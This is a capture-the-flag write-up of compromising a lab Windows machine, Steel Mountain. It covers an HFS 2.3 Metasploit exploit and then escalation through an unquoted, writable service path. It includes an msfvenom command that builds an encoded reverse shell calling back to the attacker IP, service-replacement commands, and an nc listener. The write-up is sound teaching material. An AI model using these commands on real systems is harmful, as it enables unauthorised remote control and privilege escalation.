>Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.


VICTIM IP : 10.10.59.248
MY IP : 10.10.70.163 or 10.10.48.94

Open in broswer:

![[Pasted image 20230926091331.png]]

Who is the employee of the month? Bill Harper

# Nmap Scan

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     P3MR0
|     steelmountain0
|     230925070656Z
|     240326070656Z0
|     steelmountain0
|     ;hnn
|     [-?+.
|     $0"0
|     m*1{
|     ,BlT
|_    (`z?F
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-09-25T07:06:56
|_Not valid after:  2024-03-26T07:06:56
|_ssl-date: 2023-09-26T07:12:49+00:00; -1s from scanner time.
8080/tcp  open  http          httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC

```

```
Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:4f:5d:ad:3a:37 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-26 08:12:49
|_  start_date: 2023-09-26 08:06:47

```

In http://IP:8080 we have:

![[Pasted image 20230926091737.png]]

> An HTTP file server is typically a software application or a component of a web server that allows users to access and download files using the HTTP (Hypertext Transfer Protocol) or its secure counterpart, HTTPS (HTTP Secure). These servers are commonly used for sharing files over the internet, often via a web interface.

Use metasploit to search an exploit:

![[Pasted image 20230926093613.png]]

Set it and run:

![[Pasted image 20230926093650.png]]

We are in!

# Privilege Escalation

I will use the [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) tool.
Upload it to victim:

![[Pasted image 20230926100459.png]]

And use it in Powershell:

![[Pasted image 20230926100903.png]]

We found:

![[Pasted image 20230926101131.png]]

Note:
- the `CanRestart` is set to `True`
- The vulnerability is `Unquoted Service Paths`

## What is Unquoted Service Paths ?

Unquoted Service Paths" refers to a type of security vulnerability or misconfiguration commonly found in Windows operating systems. It is a specific class of privilege escalation vulnerability that can potentially allow an attacker to execute arbitrary code with elevated privileges.

In Windows, services are programs or processes that run in the background and can perform various tasks. Each service is associated with an executable file, and the path to this executable file is typically specified in the Windows Registry. ==The issue arises when the path to the executable contains spaces, and it is not enclosed in double quotes==.

For example, let's say there's a service called "MyService" with an executable path like this in the Registry:

```
C:\Program Files\MyService\myservice.exe
```

If this path is not enclosed in double quotes and there are spaces in the path, Windows may interpret it incorrectly. In some cases, ==Windows may execute a different program with elevated privileges instead of the intended service==. This can be exploited by an attacker to run malicious code with elevated permissions, potentially compromising the system's security.

## Exploit the vulnerability

Service name : `AdvancedSystemCareService9`

We note the path:
`Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

NOTE: we can also use the command `sc qc "AdvancedSystemCareService9"`:

![[Pasted image 20230926103141.png]]

We use the command `icacls "C:\Program Files (x86)\IObit"` to view if we can act on IObit folder.

![[Pasted image 20230926103453.png]]

And also `icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"`

![[Pasted image 20230926103727.png]]

In both there is: `STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)`
So, we can write it:
1. **(I):** This indicates that the permission is inherited from a parent folder. Inherited permissions come from a higher-level folder in the directory hierarchy. Inherited permissions are automatically applied to the current file or directory unless explicitly modified.
2. **(OI):** This stands for "Object Inherit." It means that the permission can be inherited by objects (subfolders or files) within the current directory.
3. **(CI):** This stands for "Container Inherit." It means that the permission can be inherited by containers (subfolders) within the current directory.
    
4. **(RX):** This part specifies permissions for the file or directory itself:
    
    - **Read (R):** This permission allows the user or group to view the contents of the file or directory.
        
    - **Execute (X):** This permission allows the user or group to execute (run) executable files or traverse directories (enter directories). It's important to note that execute permission is often necessary for accessing the contents of directories, even if you don't intend to execute files within them.
        
5. **(W):** ==This permission stands for "Write." It allows the user or group to modify and write to the file or directory, including creating new files or subfolders within the directory.==



> The ==CanRestart option being true, allows us to restart a service on the system==, the ==directory to the application is also write-able==. This means we can <u>replace the legitimate application with our malicious one</u>, restart the service, which will run our infected program!

SO:

1. create a reverse shell with msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.48.94 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

2. upload it 

```
meterpreter > upload ASCService.exe
```

3. stop the service

```
sc stop AdvancedSystemCareService9
```

![[Pasted image 20230926104539.png]]


4. replace ASCService.exe with malicious one
```
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

![[Pasted image 20230926104723.png]]

5. Open a nc listener

`nc -lvnp 4443`

6. restart the service

`sc start AdvancedSystemCareService9`

![[Pasted image 20230926104943.png]]

And we are root:

![[Pasted image 20230926105027.png]]

